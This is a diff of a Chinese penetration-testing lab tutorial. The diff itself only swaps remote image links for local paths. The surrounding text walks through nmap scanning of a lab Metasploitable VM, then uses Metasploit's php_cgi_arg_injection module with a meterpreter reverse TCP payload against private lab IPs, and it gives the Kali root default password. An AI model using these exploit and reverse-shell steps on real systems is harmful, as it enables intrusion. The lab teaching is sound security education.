@@ -13,7 +13,7 @@
 本实验通过对实验楼目标靶机 Metasploit 的渗透扫描，进行必要的信息收集。这一阶段的准备工作，为后面的渗透攻击打下坚实的基础。本实验的主要知识点如下：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479952716307.png-wm)
+![图片描述](../imgs/1479952716307.png-wm.png)
 
 
 ### 1.3 实验环境
@@ -28,7 +28,7 @@
 
 本实验在实验楼的环境下进行。在实验楼的环境中，采用的实验环境包含两台虚拟机，分别是攻击机和靶机，攻击机和靶机的账户和密码参数思维导图如下：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479889983908.png-wm)
+![图片描述](../imgs/1479889983908.png-wm.png)
 
 
 ## 二、环境启动
@@ -40,18 +40,18 @@
 首先使用 `virsh list` 命令查看当前环境中虚拟机的列表和状态，注意需要使用 sudo，另外需要加上参数 `--all` 才会显示所有关机状态的虚拟机：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890445878.png-wm)
+![图片描述](../imgs/1479890445878.png-wm_2.png)
 
 然后我们使用 `virsh start` 命令启动虚拟机，再次查看状态虚拟机已经进入 running 状态：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890565816.png-wm)
+![图片描述](../imgs/1479890565816.png-wm_2.png)
 
 注意由于虚拟机启动需要时间，大概要等四分钟左右我们就可以使用 SSH 访问两台虚拟机了。
 
 首先使用 SSH 连接到 Kali，我们大部分的攻击操作都需要在 Kali 虚拟机中进行，注意用户名root，密码 toor 是不显示的，使用命令 `ssh root@kali` 即可，因为当前实验环境中已经把 IP 地址和主机名的对应写入到了 `/etc/hosts` 文件中，避免输入不好记的 IP 地址：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890676283.png-wm)
+![图片描述](../imgs/1479890676283.png-wm_2.png)
 
 现在两台实验环境都已经启动，我们可以开始渗透测试实验了。
 
@@ -64,7 +64,7 @@
 该漏洞扫描工具，主要由国内著名的民间黑客组织“安全焦点”完成，从2000年的内部测试版 X-Scan V0.2 到目前的最新版本 X-Scan 3.3-cn 都凝聚了国内众多黑客的心血。最值得一提的是，X-Scan 把扫描报告和安全焦点网站相连接，对扫描到的每个漏洞进行“风险等级”评估，并提供漏洞描述、漏洞溢出程序，方便网管测试、修补漏洞。
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479954359490.png-wm)
+![图片描述](../imgs/1479954359490.png-wm.png)
 
 X-Scan 是一款网络/操作系统弱点扫描工具，它的代码是开源的。
 
@@ -75,7 +75,7 @@ X-Scan 是一款网络/操作系统弱点扫描工具，它的代码是开源的
 1998年，Nessus 的创办人Renaud Deraison 展开了一项名为 "Nessus" 的计划，其计划目的是希望能为互联网社群提供一个免费、威力强大、更新频繁并简易使用的远端系统安全扫描程式。2002年时，Renaud与Ron Gula, Jack Huffard 创办了一个名为 Tenable Network  Security 机构。在第三版的 Nessus 释出之时，该机构收回了 Nessus 的版权与程式源代码（原本为开放源代码），并注册了 nessus.org 成为该机构的网站。目前此机构位于美国马里兰州的哥伦比亚。
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479954934692.png-wm)
+![图片描述](../imgs/1479954934692.png-wm.png)
 
 该工具，也是网络/操作系统（Linux,Windows）弱点扫描常用的工具，它的代码也是开源的。
 
@@ -104,7 +104,7 @@ sudo msfconsole
 如果一切顺利，你将会看到如下画面：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479956052321.png-wm)
+![图片描述](../imgs/1479956052321.png-wm.png)
 
 使用漏洞扫描工具 Nmap 对所要进行渗透的目标主机进行渗透扫描，在实验楼 Kali 终端中，输入命令：
 
@@ -113,7 +113,7 @@ sudo msfconsole
 nmap -sS -T4 target
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479956267503.png-wm)
+![图片描述](../imgs/1479956267503.png-wm.png)
 
 其中，扫描神器 nmap 参数所代表的含义分别是：
 
@@ -135,12 +135,12 @@ nmap -sS -T4 target
 192.168.122.102:80
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479958163009.png-wm)
+![图片描述](../imgs/1479958163009.png-wm.png)
 
 接着通过 `search` 命令，我们可以找到该攻击模块：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479958424668.png-wm)
+![图片描述](../imgs/1479958424668.png-wm.png)
 
 
 ```
@@ -153,7 +153,7 @@ use exploit/multi/http/php_cgi_arg_injection
 show options
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479963740362.png-wm)
+![图片描述](../imgs/1479963740362.png-wm.png)
 
 接着设置渗透目标靶机地址参数：
 
@@ -162,14 +162,14 @@ show options
 set RHOST 192.168.122.102
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479964093422.png-wm)
+![图片描述](../imgs/1479964093422.png-wm.png)
 
 ```
 # show 显示可用模块
 show payloads
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479964433170.png-wm)
+![图片描述](../imgs/1479964433170.png-wm.png)
 
 
 ```
@@ -178,7 +178,7 @@ set PAYLOAD php/meterpreter/reverse_tcp
 
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479964503718.png-wm)
+![图片描述](../imgs/1479964503718.png-wm.png)
 
 ```
 # 使用 show 命令，在进行参数查看
@@ -186,7 +186,7 @@ show options
 
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479964653341.png-wm)
+![图片描述](../imgs/1479964653341.png-wm.png)
 
 设置本地主机的 IP 地址参数 LHOST：
 
@@ -195,7 +195,7 @@ show options
 set LHOST 192.168.122.101
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479964760386.png-wm)
+![图片描述](../imgs/1479964760386.png-wm.png)
 
 
 ### 4.2 进行渗透攻击
@@ -208,7 +208,7 @@ exploit
 
 ```
 渗透成功后，你将会见到如下界面：
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479964978185.png-wm)
+![图片描述](../imgs/1479964978185.png-wm.png)
 
 下面让我们输入命令，验证渗透成功，在实验楼 Kali 的 MSF 终端中输入命令，如下图，查看渗透靶机的系统信息：
 
@@ -217,7 +217,7 @@ exploit
 sysinfo
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479965171278.png-wm)
+![图片描述](../imgs/1479965171278.png-wm.png)
 
 
 ## 五、总结
@@ -237,7 +237,7 @@ nmap -sS -T4 <target ip>
 我们知道，通常的黑客攻击包括预攻击、攻击和后攻击三个阶段：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479951032292.png-wm)
+![图片描述](../imgs/1479951032292.png-wm.png)
 
 
 预攻击阶段主要指一些信息收集和漏洞扫描的过程；攻击过程主要是利用第一阶段发现的漏洞或弱口令等脆弱性进行入侵。
